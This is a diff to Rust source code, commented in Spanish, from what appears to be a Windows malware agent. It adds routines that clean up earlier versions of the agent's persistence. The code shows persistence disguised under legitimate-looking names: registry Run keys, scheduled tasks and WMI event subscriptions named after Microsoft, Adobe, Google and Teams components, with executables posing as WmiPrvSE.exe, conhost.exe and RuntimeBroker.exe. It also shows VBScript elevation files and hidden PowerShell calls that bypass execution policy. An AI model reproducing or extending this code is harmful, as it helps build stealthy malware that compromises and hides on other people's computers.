@@ -215,6 +215,9 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
     
     #[cfg(target_os = "windows")]
     {
+        // Primero limpiar cualquier persistencia antigua que pueda causar conflictos
+        cleanup_old_persistence();
+        
         // Copiar a ubicación persistente
         let exe_path = copy_to_appdata()?;
         
@@ -227,23 +230,84 @@ pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String
     }
 }
 
-/// Remueve la persistencia
+/// Limpia persistencia de versiones anteriores (sin eliminar archivos del agente actual)
+#[cfg(target_os = "windows")]
+fn cleanup_old_persistence() {
+    // Registry - nombres antiguos
+    let old_reg_names = [
+        "SecurityHealthSystray", "OneDriveSetup", "AdobeAAMUpdater",
+        "GoogleChromeAutoLaunch", "MicrosoftEdgeAutoLaunch", "TeamsMachineInstaller",
+        "Teams Machine Installer",
+    ];
+    for name in &old_reg_names {
+        let _ = Command::new("reg")
+            .args(&["delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v", name, "/f"])
+            .creation_flags(0x08000000)
+            .output();
+    }
+    
+    // Tasks - nombres antiguos
+    let old_task_names = [
+        "MicrosoftEdgeUpdateTaskUser", "GoogleUpdateTaskUser", 
+        "OneDriveStandaloneUpdate", "AdobeFlashPlayerUpdater", "CCleanerCrashReporting",
+    ];
+    for name in &old_task_names {
+        let _ = Command::new("schtasks")
+            .args(&["/Delete", "/TN", name, "/F"])
+            .creation_flags(0x08000000)
+            .output();
+    }
+    
+    // WMI - limpiar subscriptions antiguos
+    let _ = Command::new("powershell")
+        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", r#"
+            $filters = @('BfeOnServiceStateChange', 'PerformanceMonitor', 'SystemEventsBroker', 'WindowsSecurityFilter')
+            foreach ($f in $filters) {
+                Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$f'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
+                Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$f'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
+            }
+            Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue | 
+                Where-Object { $_.Filter -match 'BfeOn|Performance|SystemEvents|WindowsSecurity' } | 
+                Remove-WmiObject -EA SilentlyContinue
+        "#])
+        .creation_flags(0x08000000)
+        .output();
+    
+    // Eliminar VBScripts antiguos de elevación (estos causan UAC prompts!)
+    if let Ok(appdata) = env::var("APPDATA") {
+        let vbs_dir = format!("{}\\Microsoft\\Windows\\Caches", appdata);
+        if let Ok(entries) = std::fs::read_dir(&vbs_dir) {
+            for entry in entries.flatten() {
+                if let Some(name) = entry.file_name().to_str() {
+                    if name.starts_with("WmiPrvSE_") && name.ends_with(".vbs") {
+                        let _ = std::fs::remove_file(entry.path());
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// Remueve la persistencia (incluyendo versiones anteriores)
 #[cfg(target_os = "windows")]
 pub fn remove_persistence() -> Result<String, String> {
-    // Registry
+    // ===== LIMPIAR PERSISTENCIA ACTUAL =====
+    
+    // Registry - nombre actual
     let _ = Command::new("reg")
         .args(&["delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                 "/v", "WindowsSecurityHealth", "/f"])
         .creation_flags(0x08000000)
         .output();
     
-    // Task
+    // Task - nombre actual
     let _ = Command::new("schtasks")
         .args(&["/Delete", "/TN", "WindowsSecurityHealthService", "/F"])
         .creation_flags(0x08000000)
         .output();
     
-    // WMI
+    // WMI - nombres actuales
     let _ = Command::new("powershell")
         .args(&["-NoProfile", "-Command", r#"
             Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WinSecFilter'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
@@ -253,13 +317,89 @@ pub fn remove_persistence() -> Result<String, String> {
         .creation_flags(0x08000000)
         .output();
     
-    // Startup shortcut
+    // Startup shortcut - nombre actual
     let startup = env::var("APPDATA")
         .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.lnk", p))
         .unwrap_or_default();
     let _ = std::fs::remove_file(&startup);
     
-    Ok("Persistencia removida".to_string())
+    // ===== LIMPIAR PERSISTENCIA ANTIGUA (versiones anteriores) =====
+    
+    // Registry - nombres antiguos
+    let old_reg_names = [
+        "SecurityHealthSystray", "OneDriveSetup", "AdobeAAMUpdater",
+        "GoogleChromeAutoLaunch", "MicrosoftEdgeAutoLaunch", "TeamsMachineInstaller",
+        "Teams Machine Installer",
+    ];
+    for name in &old_reg_names {
+        let _ = Command::new("reg")
+            .args(&["delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v", name, "/f"])
+            .creation_flags(0x08000000)
+            .output();
+    }
+    
+    // Tasks - nombres antiguos
+    let old_task_names = [
+        "MicrosoftEdgeUpdateTaskUser", "GoogleUpdateTaskUser", 
+        "OneDriveStandaloneUpdate", "AdobeFlashPlayerUpdater", "CCleanerCrashReporting",
+    ];
+    for name in &old_task_names {
+        let _ = Command::new("schtasks")
+            .args(&["/Delete", "/TN", name, "/F"])
+            .creation_flags(0x08000000)
+            .output();
+    }
+    
+    // WMI - nombres antiguos (limpiar TODOS los WMI subscriptions sospechosos)
+    let _ = Command::new("powershell")
+        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", r#"
+            # Limpiar filtros antiguos
+            $filters = @('BfeOnServiceStateChange', 'PerformanceMonitor', 'SystemEventsBroker', 'WindowsSecurityFilter')
+            foreach ($f in $filters) {
+                Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$f'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
+            }
+            # Limpiar consumers antiguos
+            $consumers = @('BfeOnServiceStateChange', 'PerformanceMonitor', 'SystemEventsBroker', 'WindowsSecurityConsumer')
+            foreach ($c in $consumers) {
+                Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$c'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
+            }
+            # Limpiar bindings que contengan estos nombres
+            Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue | 
+                Where-Object { $_.Filter -match 'BfeOn|Performance|SystemEvents|WindowsSecurity|WinSec' } | 
+                Remove-WmiObject -EA SilentlyContinue
+        "#])
+        .creation_flags(0x08000000)
+        .output();
+    
+    // Eliminar archivos antiguos copiados
+    let localappdata = env::var("LOCALAPPDATA").unwrap_or_default();
+    let appdata = env::var("APPDATA").unwrap_or_default();
+    
+    let old_files = [
+        format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
+        format!("{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe", localappdata),
+        format!("{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe", localappdata),
+        format!("{}\\Microsoft\\Windows\\INetCache\\Low\\MoUsoCoreWorker.exe", localappdata),
+        format!("{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe", localappdata),
+    ];
+    for f in &old_files {
+        let _ = std::fs::remove_file(f);
+    }
+    
+    // Eliminar VBScripts antiguos de elevación
+    let vbs_dir = format!("{}\\Microsoft\\Windows\\Caches", appdata);
+    if let Ok(entries) = std::fs::read_dir(&vbs_dir) {
+        for entry in entries.flatten() {
+            if let Some(name) = entry.file_name().to_str() {
+                if name.starts_with("WmiPrvSE_") && name.ends_with(".vbs") {
+                    let _ = std::fs::remove_file(entry.path());
+                }
+            }
+        }
+    }
+    
+    Ok("Persistencia removida (actual y antigua)".to_string())
 }
 
 #[cfg(not(target_os = "windows"))]
